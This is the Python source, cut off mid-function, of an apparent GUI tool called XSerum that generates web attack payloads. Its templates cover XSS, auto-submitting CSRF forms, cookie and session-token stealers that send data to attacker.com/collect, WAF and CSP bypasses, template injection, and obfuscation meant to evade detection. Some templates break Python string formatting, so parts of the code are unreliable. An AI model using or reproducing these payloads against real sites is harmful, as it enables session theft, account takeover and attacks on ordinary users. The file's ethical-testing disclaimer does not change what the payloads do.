#!/usr/bin/env python3
"""
XSerum - Web Attack Payload Generator

A Python Tkinter-based security tool for generating various web attack payloads
with multiple obfuscation options. This tool is intended for ethical hacking,
penetration testing, and security awareness training only.
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import base64
import urllib.parse
import re
import os
import sys
import string
import random
import webbrowser
import json
from datetime import datetime
import tempfile

class ToolTip:
    """
    Creates a professional military-grade tooltip for a given widget when the mouse hovers over it.
    Features rapid fade in/out, auto-timeout, and sleek appearance.
    """
    def __init__(self, widget, text):
        self.widget = widget
        self.text = text
        self.tooltip = None
        self.timer_id = None
        self.auto_hide_id = None
        
        # Only bind if there's actual text to display
        if text and text.strip():
            self.widget.bind("<Enter>", self.schedule_show)
            self.widget.bind("<Leave>", self.schedule_hide)
            self.widget.bind("<Button>", self.immediate_hide)  # Hide on click
        
    def schedule_show(self, event=None):
        """Schedule tooltip to appear after a short delay to prevent accidental triggers"""
        # Cancel any existing timers
        self.cancel_timers()
        
        # Schedule new timer for showing tooltip
        self.timer_id = self.widget.after(150, self.show_tooltip)
        
    def schedule_hide(self, event=None):
        """Schedule tooltip to disappear quickly but smoothly"""
        # Cancel showing timer if it exists
        if self.timer_id:
            self.widget.after_cancel(self.timer_id)
            self.timer_id = None
            
        # Schedule hiding
        self.immediate_hide()
    
    def cancel_timers(self):
        """Cancel all existing timers"""
        if self.timer_id:
            self.widget.after_cancel(self.timer_id)
            self.timer_id = None
            
        if self.auto_hide_id:
            self.widget.after_cancel(self.auto_hide_id)
            self.auto_hide_id = None
            
    def immediate_hide(self, event=None):
        """Hide the tooltip immediately with a quick fade-out"""
        self.cancel_timers()
        
        if self.tooltip:
            # Quick fade-out effect (faster than before)
            for i in range(100, -1, -33):  # Faster fade-out
                alpha = i / 100
                try:
                    self.tooltip.attributes("-alpha", alpha)
                    self.tooltip.update()
                    self.widget.after(1)  # Much faster than before
                except tk.TclError:
                    # Tooltip was already destroyed
                    break
                    
            try:
                self.tooltip.destroy()
            except tk.TclError:
                pass
            finally:
                self.tooltip = None
        
    def show_tooltip(self):
        """Display the tooltip with precise positioning and clean styling"""
        # Clean up any existing tooltip first
        self.immediate_hide()
        
        # Don't show empty tooltips
        if not self.text or self.text.strip() == "":
            return
            
        # Calculate position to be bottom center of widget
        x = self.widget.winfo_rootx() + self.widget.winfo_width() // 2
        y = self.widget.winfo_rooty() + self.widget.winfo_height() + 3  # Closer to the widget
        
        # Create the tooltip window
        self.tooltip = tk.Toplevel(self.widget)
        self.tooltip.wm_overrideredirect(True)  # Remove window decorations
        self.tooltip.wm_geometry(f"+{x}+{y}")
        
        # Set initial opacity to 0
        self.tooltip.attributes("-alpha", 0.0)
        
        # Enhanced modern tooltip style
        frame = tk.Frame(self.tooltip, background="#1E2124", borderwidth=1, relief=tk.SOLID)
        frame.pack(fill=tk.BOTH, expand=True)
        
        label = tk.Label(frame, text=self.text, justify=tk.LEFT,
                         background="#1E2124", foreground="#E5E5E5", 
                         borderwidth=0, padx=6, pady=4,
                         font=("Helvetica", 9),
                         wraplength=350)
        label.pack()
        
        # Rapid fade-in effect
        for i in range(0, 101, 25):  # 0, 25, 50, 75, 100 - faster than before
            alpha = i / 100
            try:
                self.tooltip.attributes("-alpha", alpha)
                self.tooltip.update()
                self.widget.after(1)  # Much faster fade
            except tk.TclError:
                return  # Tooltip was destroyed during fade-in
        
        # Auto-hide tooltip after 4 seconds (military-grade UI shouldn't keep info visible too long)
        self.auto_hide_id = self.widget.after(4000, self.immediate_hide)


class XSerum:
    """
    Main application class for XSerum web attack payload generator.
    """
    def __init__(self, root):
        self.root = root
        self.root.title("XSerum - Web Attack Payload Generator")
        self.root.geometry("950x700")
        self.root.minsize(950, 700)
        
        self.setup_variables()
        self.create_ui()
        self.setup_events()
        
    def setup_variables(self):
        """Initialize application variables and payload templates"""
        self.attack_types = [
            "Reflected XSS", 
            "Stored XSS", 
            "DOM-based XSS", 
            "CSRF Payloads", 
            "HTML Injection", 
            "JavaScript Payloads",
            "Advanced WAF Bypass",
            "Session Hijacking",
            "Content Security Policy Bypass",
            "Server-side Template Injection"
        ]
        
        self.obfuscation_types = [
            "Base64 Encoding",
            "JavaScript String Split/Concat",
            "Unicode Escape Sequence",
            "HTML Entity Encoding",
            "Polymorphic Code Generation",
            "Double Encoding",
            "Multi-layer Obfuscation"
        ]
        
        self.output_formats = [
            "Raw Code",
            "HTML File",
            "URL-encoded"
        ]
        
        # Dictionary to store dynamic input fields
        self.input_fields = {}
        self.input_labels = {}
        self.input_frames = {}
        
        # Descriptions for attack types (used for tooltips)
        self.attack_descriptions = {
            "Reflected XSS": "Injects malicious scripts that are immediately reflected back in the HTTP response and executed in the user's browser.",
            "Stored XSS": "Injects malicious scripts that are stored on the target server and executed when victims view the affected page.",
            "DOM-based XSS": "Exploits client-side JavaScript to manipulate the Document Object Model (DOM) in a victim's browser.",
            "CSRF Payloads": "Creates forms that trick users into submitting requests to a website where they're authenticated, performing unintended actions.",
            "HTML Injection": "Inserts arbitrary HTML into a vulnerable page, potentially changing its appearance or behavior.",
            "JavaScript Payloads": "Pre-crafted JavaScript code snippets that perform specific malicious actions on a victim's browser.",
            "Advanced WAF Bypass": "Sophisticated payloads designed to evade Web Application Firewalls through various encoding and obfuscation techniques.",
            "Session Hijacking": "Techniques to steal or forge user session tokens, enabling unauthorized access to user accounts.",
            "Content Security Policy Bypass": "Methods to circumvent Content Security Policy (CSP) protections that restrict script execution sources.",
            "Server-side Template Injection": "Exploits template engines by injecting template syntax that can lead to remote code execution on the server."
        }
        
        # Field definitions for each attack type
        self.field_definitions = {
            "Reflected XSS": [
                {"name": "script", "label": "JavaScript Payload", "default": "alert(document.cookie)"},
                {"name": "tag", "label": "HTML Tag (optional)", "default": ""}
            ],
            "Stored XSS": [
                {"name": "script", "label": "JavaScript Payload", "default": "alert(document.cookie)"},
                {"name": "persistence", "label": "Persistence Method", "default": "localStorage"},
                {"name": "trigger_event", "label": "Trigger Event", "default": "onload"}
            ],
            "DOM-based XSS": [
                {"name": "script", "label": "JavaScript Payload", "default": "alert(document.cookie)"},
                {"name": "dom_method", "label": "DOM Method", "default": "innerHTML"}
            ],
            "CSRF Payloads": [
                {"name": "target_url", "label": "Target URL", "default": "https://example.com/api/action"},
                {"name": "method", "label": "HTTP Method", "default": "POST"},
                {"name": "form_fields", "label": "Form Fields (JSON)", "default": '{"param1": "value1", "param2": "value2"}'}
            ],
            "HTML Injection": [
                {"name": "html_content", "label": "HTML Content", "default": "<div style='color:red'>Injected content</div>"},
                {"name": "insertion_point", "label": "Insertion Point", "default": "body"}
            ],
            "JavaScript Payloads": [
                {"name": "payload_type", "label": "Payload Type", "default": "cookie_stealer"},
                {"name": "exfil_url", "label": "Exfiltration URL", "default": "https://attacker.com/collect"}
            ],
            "Advanced WAF Bypass": [
                {"name": "script", "label": "JavaScript Payload", "default": "alert(document.cookie)"},
                {"name": "waf_type", "label": "WAF Type", "default": "ModSecurity"},
                {"name": "evasion_technique", "label": "Evasion Technique", "default": "case_randomization"}
            ],
            "Session Hijacking": [
                {"name": "exfil_url", "label": "Exfiltration URL", "default": "https://attacker.com/collect"},
                {"name": "token_name", "label": "Session Token Name", "default": "sessionid"},
                {"name": "hijack_method", "label": "Hijacking Method", "default": "cookie_theft"}
            ],
            "Content Security Policy Bypass": [
                {"name": "script", "label": "JavaScript Payload", "default": "alert(document.cookie)"},
                {"name": "csp_policy", "label": "Target CSP (if known)", "default": "default-src 'self'; script-src 'self'"},
                {"name": "bypass_technique", "label": "Bypass Technique", "default": "jsonp"}
            ],
            "Server-side Template Injection": [
                {"name": "template_engine", "label": "Template Engine", "default": "jinja2"},
                {"name": "payload", "label": "Template Payload", "default": "{{7*7}}"},
                {"name": "context", "label": "Injection Context", "default": "url_parameter"}
            ]
        }
        
        # Payload templates for each attack type
        self.payload_templates = {
            "Reflected XSS": {
                "basic": "<script>{script}</script>",
                "event_based": '<img src="x" onerror="{script}">',
                "javascript_uri": '<a href="javascript:{script}">Click me</a>',
                "tag_manipulation": '<{tag} onmouseover="{script}">{tag} content</{tag}>'
            },
            "Stored XSS": {
                "basic": "<script>{script}</script>",
                "persistent": "<script>localStorage.setItem('xss', '{script}'); window.{trigger_event} = function() {{ eval(localStorage.getItem('xss')); }}</script>"
            },
            "DOM-based XSS": {
                "innerHTML": "<img src='x' onload=\"document.getElementById('target').innerHTML='{script}'\">",
                "document_write": "<script>document.write('{script}')</script>",
                "location_href": "<script>location.href = 'javascript:{script}'</script>"
            },
            "CSRF Payloads": {
                "auto_submit_form": """
<form id="csrf_form" action="{target_url}" method="{method}" style="display:none">
{form_inputs}
</form>
<script>document.getElementById('csrf_form').submit();</script>
"""
            },
            "HTML Injection": {
                "block": "{html_content}",
                "iframe": "<iframe src=\"{target_url}\" width=\"100%\" height=\"500\"></iframe>",
                "form": "<form action=\"{target_url}\" method=\"post\">{html_content}</form>"
            },
            "JavaScript Payloads": {
                "cookie_stealer": """
<script>
fetch('{exfil_url}?cookies='+encodeURIComponent(document.cookie))
.then(response => console.log('Data sent'))
.catch(error => console.error('Error:', error));
</script>
""",
                "redirector": "<script>window.location.href = '{exfil_url}';</script>",
                "popup_spam": "<script>for(let i=0; i<10; i++) { window.open('{exfil_url}', '_blank'); }</script>"
            },
            "Advanced WAF Bypass": {
                "case_randomization": """
<ScRiPt>
  {script}
</sCrIpT>
""",
                "tag_obfuscation": """
<script/x>
  {script}
</script>
""",
                "modsecurity_bypass": """
<div style="x:\x00expression({script})"></div>
""",
                "cloudflare_bypass": """
<svg onload="{script}">
"""
            },
            "Session Hijacking": {
                "cookie_theft": """
<script>
(function() {
  let sessToken = document.cookie.match(new RegExp('(^| ){0}=([^;]+)'.replace('{0}', '{token_name}')));
  if (sessToken) {
    fetch('{exfil_url}?token=' + encodeURIComponent(sessToken[2]) + '&domain=' + encodeURIComponent(document.domain))
      .then(() => console.log('Session token exfiltrated'))
      .catch(e => console.error(e));
  }
})();
</script>
""",
                "session_poisoning": """
<script>
// Session poisoning attack
document.cookie = "{token_name}=FORGED_TOKEN; path=/";
console.log("Session poisoned with forged token: {token_name}");
</script>
""",
                "xss_session_stealer": """
<script>
// Create a hidden iframe to maintain target session while stealing it
var hiddenFrame = document.createElement('iframe');
hiddenFrame.style.display = 'none';
hiddenFrame.onload = function() {
  try {
    var stolenCookie = this.contentWindow.document.cookie;
    fetch('{exfil_url}?stolen=' + encodeURIComponent(stolenCookie))
      .then(response => console.log('Session data sent'))
      .catch(error => console.error('Error:', error));
  } catch(e) {
    console.error('Cross-origin restrictions prevented session theft');
  }
};
document.body.appendChild(hiddenFrame);
hiddenFrame.src = '/';
</script>
"""
            },
            "Content Security Policy Bypass": {
                "jsonp": """
<script>
// Bypass CSP using JSONP endpoint
const script = document.createElement('script');
script.src = "https://jsonp-provider.com/endpoint?callback={script}";
document.body.appendChild(script);
</script>
""",
                "angular_template": """
<script>
// Bypass CSP using AngularJS template injection
</script>
<div ng-app>
  <div ng-csp="no-unsafe-eval">
    {{ {'x': '{script}'}.x }}
  </div>
</div>
""",
                "dom_clobbering": """
<script>
// DOM Clobbering technique to bypass CSP
</script>
<form id="bypass"><input id="bypass" name="valueOf"></form>
<script>
// The object can now be used to bypass certain CSP restrictions
window.bypass.valueOf = {script};
</script>
"""
            },
            "Server-side Template Injection": {
                "jinja2": """
{{{{ {payload} }}}}
""",
                "twig": """
{{{{ {payload} }}}}
""",
                "freemarker": """
${{{{ {payload} }}}}
""",
                "velocity": """
#set( $x = {payload} )
{{{{ $x }}}}
"""
            }
        }
        
        # Example payload options for dropdown menus
        self.payload_options = {
            "Reflected XSS": ["basic", "event_based", "javascript_uri", "tag_manipulation"],
            "Stored XSS": ["basic", "persistent"],
            "DOM-based XSS": ["innerHTML", "document_write", "location_href"],
            "CSRF Payloads": ["auto_submit_form"],
            "HTML Injection": ["block", "iframe", "form"],
            "JavaScript Payloads": ["cookie_stealer", "redirector", "popup_spam"],
            "Advanced WAF Bypass": ["case_randomization", "tag_obfuscation", "modsecurity_bypass", "cloudflare_bypass"],
            "Session Hijacking": ["cookie_theft", "session_poisoning", "xss_session_stealer"],
            "Content Security Policy Bypass": ["jsonp", "angular_template", "dom_clobbering"],
            "Server-side Template Injection": ["jinja2", "twig", "freemarker", "velocity"]
        }
        
        # Selected values
        self.selected_attack = tk.StringVar(value=self.attack_types[0])
        self.selected_obfuscation = {}
        for obf_type in self.obfuscation_types:
            self.selected_obfuscation[obf_type] = tk.BooleanVar(value=False)
        
        self.selected_output = tk.StringVar(value=self.output_formats[0])
        self.selected_payload_option = tk.StringVar()
        
    def create_ui(self):
        """Create the user interface elements with a professional, military-grade appearance"""
        # Configure root window with a dark theme for a professional look
        self.root.configure(background="#1E2124")
        
        # Apply a consistent style to all elements
        style = ttk.Style()
        style.theme_use('clam')  # Use clam theme as base, it's most customizable
        
        # Configure colors for a sleek, dark military-grade tactical UI
        style.configure('TFrame', background='#1E2124')
        style.configure('TLabel', background='#1E2124', foreground='#E5E5E5')
        
        # Custom labelframe with military-grade styling
        style.configure('TLabelframe', 
                      background='#1E2124', 
                      foreground='#E5E5E5',
                      bordercolor='#36393F',
                      darkcolor='#2F3136',
                      lightcolor='#7289DA',
                      borderwidth=2)
        style.configure('TLabelframe.Label', 
                      background='#1E2124', 
                      foreground='#7289DA')
                      
        # Tactical-looking buttons with disciplined design
        style.configure('TButton', 
                      background='#36393F', 
                      foreground='#E5E5E5', 
                      borderwidth=1,
                      focuscolor='#7289DA',
                      lightcolor='#36393F',
                      darkcolor='#2F3136')
        style.map('TButton', 
                 background=[('active', '#2F3136'), ('pressed', '#202225')],
                 foreground=[('active', '#FFFFFF')])
                 
        # Checkbutton and Radiobutton configurations for clean UI
        style.configure('TCheckbutton', 
                      background='#1E2124', 
                      foreground='#E5E5E5',
                      indicatorcolor='#7289DA',
                      indicatorbackground='#36393F')
        style.map('TCheckbutton', 
                 background=[('active', '#2F3136')],
                 foreground=[('active', '#FFFFFF')])
                 
        style.configure('TRadiobutton', 
                      background='#1E2124', 
                      foreground='#E5E5E5',
                      indicatorcolor='#7289DA',
                      indicatorbackground='#36393F')
        style.map('TRadiobutton', 
                 background=[('active', '#2F3136')],
                 foreground=[('active', '#FFFFFF')])
                 
        # Dropdown menus with tactical styling
        style.configure('TCombobox', 
                      fieldbackground='#36393F', 
                      background='#36393F',
                      foreground='#E5E5E5',
                      arrowcolor='#7289DA',
                      borderwidth=1)
        style.map('TCombobox',
                 fieldbackground=[('readonly', '#36393F')],
                 background=[('readonly', '#36393F')],
                 foreground=[('readonly', '#E5E5E5')])
                 
        # Notebook styling for mission-critical information organization
        style.configure('TNotebook', 
                      background='#1E2124', 
                      borderwidth=0,
                      tabmargins=[2, 5, 2, 0])
        style.configure('TNotebook.Tab', 
                      background='#36393F', 
                      foreground='#E5E5E5', 
                      padding=[10, 2],
                      borderwidth=1,
                      focuscolor='#7289DA')
        style.map('TNotebook.Tab',
                 background=[('selected', '#7289DA')],
                 foreground=[('selected', '#FFFFFF')])
                 
        # Scrollbar styling
        style.configure('TScrollbar', 
                      background='#36393F',
                      troughcolor='#2F3136',
                      bordercolor='#1E2124',
                      arrowcolor='#7289DA',
                      borderwidth=0)
        style.map('TScrollbar',
                 background=[('active', '#7289DA')],
                 arrowcolor=[('active', '#FFFFFF')])
        
        # Configure text widgets to match the theme
        self.root.option_add("*Text*Background", "#36393F")
        self.root.option_add("*Text*Foreground", "#E5E5E5")
        self.root.option_add("*Text*selectBackground", "#7289DA")
        self.root.option_add("*Text*selectForeground", "#FFFFFF")
        self.root.option_add("*Text*insertBackground", "#E5E5E5")  # Cursor color
        
        # Configure scrolledtext to match the theme
        self.root.option_add("*ScrolledText*Background", "#36393F")
        self.root.option_add("*ScrolledText*Foreground", "#E5E5E5")
        self.root.option_add("*ScrolledText*selectBackground", "#7289DA")
        self.root.option_add("*ScrolledText*selectForeground", "#FFFFFF")
        self.root.option_add("*ScrolledText*insertBackground", "#E5E5E5")  # Cursor color
        
        # Create main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Title and subtitle in a header styled like military software
        title_frame = ttk.Frame(main_frame)
        title_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Create a header with gradient-like effect for a tactical look
        header_frame = tk.Frame(title_frame, background="#202225", height=40)
        header_frame.pack(fill=tk.X)
        
        title_label = tk.Label(header_frame, text="XSerum", 
                              font=("Helvetica", 16, "bold"),
                              foreground="#7289DA", background="#202225")
        title_label.pack(side=tk.LEFT, padx=10, pady=5)
        
        subtitle_label = tk.Label(header_frame, text="Web Attack Payload Generator",
                                 font=("Helvetica", 12),
                                 foreground="#E5E5E5", background="#202225")
        subtitle_label.pack(side=tk.LEFT, padx=(5, 0), pady=5)
        
        disclaimer_text = "For educational and ethical security testing only"
        disclaimer_label = tk.Label(header_frame, text=disclaimer_text, 
                                   foreground="#FF5555", background="#202225",
                                   font=("Helvetica", 10, "italic"))
        disclaimer_label.pack(side=tk.RIGHT, padx=10, pady=5)
        
        # Create a notebook for tabbed interface
        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True)
        
        # Generator tab
        generator_frame = ttk.Frame(notebook, padding=10)
        notebook.add(generator_frame, text="Payload Generator")
        
        # About tab
        about_frame = ttk.Frame(notebook, padding=10)
        notebook.add(about_frame, text="About")
        
        # Add content to the About tab
        self.create_about_tab(about_frame)
        
        # Configure generator tab layout in two columns
        generator_frame.columnconfigure(0, weight=1)
        generator_frame.columnconfigure(1, weight=1)
        
        # Left column - Input options
        left_frame = ttk.LabelFrame(generator_frame, text="Attack Configuration", padding=10)
        left_frame.grid(row=0, column=0, sticky="nsew", padx=(0, 5))
        
        # Attack type selection
        attack_frame = ttk.Frame(left_frame)
        attack_frame.pack(fill=tk.X, pady=(0, 10))
        
        attack_label = ttk.Label(attack_frame, text="Attack Type:")
        attack_label.pack(side=tk.LEFT)
        
        attack_combo = ttk.Combobox(attack_frame, textvariable=self.selected_attack, 
                                    values=self.attack_types, state="readonly", width=30)
        attack_combo.pack(side=tk.LEFT, padx=(5, 0), fill=tk.X, expand=True)
        ToolTip(attack_combo, "Select the type of web attack payload to generate")
        
        # Payload type selection
        payload_frame = ttk.Frame(left_frame)
        payload_frame.pack(fill=tk.X, pady=(0, 10))
        
        payload_label = ttk.Label(payload_frame, text="Payload Option:")
        payload_label.pack(side=tk.LEFT)
        
        self.payload_option_combo = ttk.Combobox(payload_frame, 
                                              textvariable=self.selected_payload_option,
                                              state="readonly", width=30)
        self.payload_option_combo.pack(side=tk.LEFT, padx=(5, 0), fill=tk.X, expand=True)
        ToolTip(self.payload_option_combo, "Select specific payload template for the selected attack type")
        
        # Attack description
        self.description_frame = ttk.LabelFrame(left_frame, text="Description")
        self.description_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.description_text = ttk.Label(self.description_frame, 
                                         text=self.attack_descriptions[self.selected_attack.get()],
                                         wraplength=400)
        self.description_text.pack(fill=tk.X, pady=5, padx=5)
        
        # Dynamic input fields container
        self.fields_frame = ttk.LabelFrame(left_frame, text="Payload Parameters")
        self.fields_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create a canvas with scrollbar for fields - military-grade tactical styling
        self.fields_canvas = tk.Canvas(self.fields_frame, background="#2F3136", 
                                     highlightthickness=0, bd=0)
        scrollbar = ttk.Scrollbar(self.fields_frame, orient="vertical", 
                                command=self.fields_canvas.yview, style="TScrollbar")
        self.scrollable_fields = ttk.Frame(self.fields_canvas)
        
        # Ensure dynamic resizing for responsive field display
        self.scrollable_fields.bind(
            "<Configure>",
            lambda e: self.fields_canvas.configure(scrollregion=self.fields_canvas.bbox("all"))
        )
        
        # Add additional bindings for better user interaction
        self.fields_canvas.bind('<Enter>', lambda e: self.fields_canvas.configure(cursor='hand2'))
        self.fields_canvas.bind('<Leave>', lambda e: self.fields_canvas.configure(cursor=''))
        
        # Mousewheel scrolling for better UX
        def _on_mousewheel(event):
            self.fields_canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        self.fields_canvas.bind_all("<MouseWheel>", _on_mousewheel)
        
        # Configure window and scrolling
        self.fields_canvas.create_window((0, 0), window=self.scrollable_fields, anchor="nw")
        self.fields_canvas.configure(yscrollcommand=scrollbar.set)
        
        # Pack components
        self.fields_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 2))
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Right column - Output and options
        right_frame = ttk.Frame(generator_frame)
        right_frame.grid(row=0, column=1, sticky="nsew", padx=(5, 0))
        
        # Obfuscation options
        obfuscation_frame = ttk.LabelFrame(right_frame, text="Obfuscation Options", padding=10)
        obfuscation_frame.pack(fill=tk.X, pady=(0, 10))
        
        for obf_type in self.obfuscation_types:
            chk = ttk.Checkbutton(obfuscation_frame, text=obf_type, 
                                 variable=self.selected_obfuscation[obf_type])
            chk.pack(anchor="w")
            tooltip_text = ""
            if obf_type == "Base64 Encoding":
                tooltip_text = "Encodes the payload using base64 and provides a decoder function"
            elif obf_type == "JavaScript String Split/Concat":
                tooltip_text = "Splits the JavaScript code into concatenated string fragments"
            elif obf_type == "Unicode Escape Sequence":
                tooltip_text = "Converts characters to their Unicode escape sequences"
            elif obf_type == "HTML Entity Encoding":
                tooltip_text = "Converts characters to their HTML entity equivalents (e.g., &#60; for <)"
            elif obf_type == "Polymorphic Code Generation":
                tooltip_text = "Creates self-modifying code that changes its signature to evade detection"
            elif obf_type == "Double Encoding":
                tooltip_text = "Applies multiple layers of encoding to bypass security filters"
            elif obf_type == "Multi-layer Obfuscation":
                tooltip_text = "Combines multiple obfuscation techniques for maximum evasion capability"
            
            ToolTip(chk, tooltip_text)
        
        # Output format
        output_format_frame = ttk.LabelFrame(right_frame, text="Output Format", padding=10)
        output_format_frame.pack(fill=tk.X, pady=(0, 10))
        
        for output_format in self.output_formats:
            rb = ttk.Radiobutton(output_format_frame, text=output_format, 
                                variable=self.selected_output, value=output_format)
            rb.pack(anchor="w")
            if output_format == "Raw Code":
                ToolTip(rb, "Plain payload code that can be copied directly")
            elif output_format == "HTML File":
                ToolTip(rb, "Complete HTML file with the payload embedded")
            else:  # URL-encoded
                ToolTip(rb, "Payload encoded for use in URL parameters")
        
        # Generate button
        btn_frame = ttk.Frame(right_frame)
        btn_frame.pack(fill=tk.X, pady=10)
        
        generate_btn = ttk.Button(btn_frame, text="Generate Payload", command=self.generate_payload)
        generate_btn.pack(side=tk.RIGHT)
        
        # Output display
        output_frame = ttk.LabelFrame(right_frame, text="Generated Payload", padding=10)
        output_frame.pack(fill=tk.BOTH, expand=True)
        
        self.output_text = scrolledtext.ScrolledText(output_frame, wrap=tk.WORD, height=15)
        self.output_text.pack(fill=tk.BOTH, expand=True)
        self.output_text.config(state=tk.DISABLED)
        
        # Footer with buttons
        footer_frame = ttk.Frame(output_frame)
        footer_frame.pack(fill=tk.X, pady=(5, 0))
        
        copy_btn = ttk.Button(footer_frame, text="Copy to Clipboard", command=self.copy_to_clipboard)
        copy_btn.pack(side=tk.LEFT)
        
        save_btn = ttk.Button(footer_frame, text="Save to File", command=self.save_to_file)
        save_btn.pack(side=tk.LEFT, padx=(5, 0))
        
        clear_btn = ttk.Button(footer_frame, text="Clear", command=self.clear_output)
        clear_btn.pack(side=tk.RIGHT)
        
        # Initialize with the first attack type
        self.update_payload_options()
        self.create_dynamic_fields(self.selected_attack.get())
        
    def create_about_tab(self, parent_frame):
        """Create content for the About tab"""
        about_text = """
XSerum - Web Attack Payload Generator

Version: 1.0
Created by: XSerum Development Team

This application is designed for educational purposes and ethical security testing only. 
It demonstrates various web security vulnerabilities by generating payloads that could 
potentially be used in attacks.

Features:
• Generate multiple types of web attack payloads
• Apply various obfuscation techniques
• Output in different formats for security testing

WARNING: Using this tool against systems without explicit permission is illegal and unethical. 
Always obtain proper authorization before conducting security tests.

Usage Guidelines:
1. Select an attack type from the dropdown
2. Configure payload parameters
3. Choose obfuscation options if needed
4. Select output format
5. Click "Generate Payload"
6. Copy or save the generated payload for testing
        """
        
        about_label = ttk.Label(parent_frame, text=about_text, wraplength=600, justify=tk.LEFT)
        about_label.pack(padx=20, pady=20, fill=tk.BOTH, expand=True)
        
    def setup_events(self):
        """Set up event bindings"""
        self.selected_attack.trace_add("write", self.on_attack_change)
        self.selected_payload_option.trace_add("write", self.on_payload_option_change)
        
    def on_attack_change(self, *args):
        """Handler for attack type change"""
        attack_type = self.selected_attack.get()
        self.description_text.config(text=self.attack_descriptions[attack_type])
        self.clear_dynamic_fields()
        self.update_payload_options()
        self.create_dynamic_fields(attack_type)
        
    def on_payload_option_change(self, *args):
        """Handler for payload option change"""
        # This could be expanded to adjust fields based on the payload option
        pass
        
    def update_payload_options(self):
        """Update the payload options dropdown based on attack type"""
        attack_type = self.selected_attack.get()
        options = self.payload_options.get(attack_type, [])
        self.payload_option_combo.config(values=options)
        if options:
            self.selected_payload_option.set(options[0])
            
    def clear_dynamic_fields(self):
        """Clear all dynamic input fields"""
        for frame in self.input_frames.values():
            frame.destroy()
        self.input_fields = {}
        self.input_labels = {}
        self.input_frames = {}
        
    def create_dynamic_fields(self, attack_type):
        """Create dynamic input fields based on attack type"""
        fields = self.field_definitions.get(attack_type, [])
        
        for i, field in enumerate(fields):
            field_name = field["name"]
            field_label = field["label"]
            field_default = field["default"]
            
            frame = ttk.Frame(self.scrollable_fields)
            frame.pack(fill=tk.X, pady=5)
            self.input_frames[field_name] = frame
            
            label = ttk.Label(frame, text=f"{field_label}:")
            label.pack(side=tk.LEFT)
            self.input_labels[field_name] = label
            
            if field_name == "form_fields":
                # For JSON input, use a text box
                var = scrolledtext.ScrolledText(frame, height=4, width=30)
                var.insert(tk.END, field_default)
                var.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0))
                self.input_fields[field_name] = var
            elif field_name == "html_content":
                # For HTML content, use a multiline text box
                var = scrolledtext.ScrolledText(frame, height=4, width=30)
                var.insert(tk.END, field_default)
                var.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0))
                self.input_fields[field_name] = var
            else:
                # For other fields, use a standard entry
                var = ttk.Entry(frame, width=30)
                var.insert(0, field_default)
                var.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0))
                self.input_fields[field_name] = var
                
    def get_field_value(self, field_name):
        """Get value from a dynamic field"""
        field = self.input_fields.get(field_name)
        if field is None:
            return ""
        
        # Check if it's a text widget or an entry
        if isinstance(field, tk.Text) or isinstance(field, scrolledtext.ScrolledText):
            return field.get("1.0", tk.END).strip()
        else:
            return field.get()
            
    def generate_payload(self):
        """Generate the payload based on selected options"""
        try:
            # Get selected values
            attack_type = self.selected_attack.get()
            payload_option = self.selected_payload_option.get()
            
            # Collect parameters from input fields
            params = {}
            for field_name in self.input_fields:
                params[field_name] = self.get_field_value(field_name)
            
            # Generate the base payload
            payload = self.create_base_payload(attack_type, payload_option, params)
            
            # Apply obfuscation
            for obf_type, selected in self.selected_obfuscation.items():
                if selected.get():
                    if obf_type == "Base64 Encoding":
                        payload = self.apply_base64_obfuscation(payload)
                    elif obf_type == "JavaScript String Split/Concat":
                        payload = self.apply_js_string_obfuscation(payload)
                    elif obf_type == "Unicode Escape Sequence":
                        payload = self.apply_unicode_obfuscation(payload)
                    elif obf_type == "HTML Entity Encoding":
                        payload = self.apply_html_entity_obfuscation(payload)
                    elif obf_type == "Polymorphic Code Generation":
                        payload = self.apply_polymorphic_obfuscation(payload)
                    elif obf_type == "Double Encoding":
                        payload = self.apply_double_encoding_obfuscation(payload)
                    elif obf_type == "Multi-layer Obfuscation":
                        payload = self.apply_multilayer_obfuscation(payload)
            
            # Apply output format
            output_format = self.selected_output.get()
            final_output = self.apply_output_format(payload, output_format, attack_type)
            
            # Display in output box
            self.output_text.config(state=tk.NORMAL)
            self.output_text.delete("1.0", tk.END)
            self.output_text.insert(tk.END, final_output)
            self.output_text.config(state=tk.DISABLED)
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to generate payload: {str(e)}")
    
    def create_base_payload(self, attack_type, payload_option, params):
        """Create the base payload based on the attack type and parameters"""
        if attack_type not in self.payload_templates:
            raise ValueError(f"Unknown attack type: {attack_type}")
            
        if payload_option not in self.payload_templates[attack_type]:
            payload_option = list(self.payload_templates[attack_type].keys())[0]
            
        template = self.payload_templates[attack_type][payload_option]
        
        # Special handling for CSRF forms
        if attack_type == "CSRF Payloads" and payload_option == "auto_submit_form":
            # Parse form fields JSON
            try:
                form_fields = json.loads(params.get("form_fields", "{}"))
            except json.JSONDecodeError:
                raise ValueError("Invalid JSON in form fields")
                
            form_inputs = ""
            for name, value in form_fields.items():
                form_inputs += f'<input type="hidden" name="{name}" value="{value}">\n'
                
            params["form_inputs"] = form_inputs
            
        # Format the template with parameters
        try:
            return template.format(**params)
        except KeyError as e:
            raise ValueError(f"Missing required parameter: {str(e)}")
    
    def apply_base64_obfuscation(self, payload):
        """Apply base64 encoding obfuscation"""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"""
<script>
// Base64 encoded payload
document.write(atob("{encoded}"));
</script>
"""
    
    def apply_js_string_obfuscation(self, payload):
        """Apply JavaScript string split/concat obfuscation"""
        if not payload.startswith("<script>") or not payload.endswith("</script>"):
            # Wrap non-script payloads
            payload = f"<script>{payload}</script>"
            
        # Extract the JavaScript part
        js_code = payload.replace("<script>", "").replace("</script>", "")
        
        # Split into chunks of random length
        chunks = []
        remaining = js_code
        while remaining:
            chunk_size = random.randint(2, 8)
            chunk = remaining[:chunk_size]
            remaining = remaining[chunk_size:]
            chunks.append(chunk)
            
